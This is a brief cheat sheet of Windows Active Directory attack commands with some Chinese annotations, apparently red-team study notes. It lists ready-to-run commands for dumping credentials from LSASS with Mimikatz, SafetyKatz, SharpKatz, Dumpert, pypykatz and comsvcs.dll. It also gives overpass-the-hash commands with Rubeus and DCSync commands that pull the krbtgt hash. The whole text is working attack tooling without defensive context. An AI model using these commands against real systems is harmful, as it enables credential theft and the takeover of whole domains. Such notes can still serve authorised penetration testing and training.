#  Extracting Credentials from LSASS

Mimikatz
```
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

SafetyKatz
```
SafetyKatz.exe "sekurlsa::ekeys"
```

SharpKatz
```
SharpKatz.exe --Command ekeys
```

Dump credentials using Dumpert (Direct System Calls and API unhooking)
```
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
```

pypykatz
```
pypykatz.exe live lsa
```
comsvcs.dll
```
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass
process ID> C:\Users\Public\lsass.dmp full
```

linux上操作

1. From a Linux attacking machine using impacket.
2. From a Linux attacking machine using Physmem2profit


# OverPass-The-Hash

需要	administrator权限

Mimikatz
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'	
```
SafetyKatz
```
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
```

## Over Pass the hash (OPTH) generate tokens from hashes or keys
下面操作不需要administrator权限
```
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```
下面操作需要administrator权限
```
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

# DCSync

Mimikatz
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```
SafetyKatz
```
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

DA一般有DCSync权限

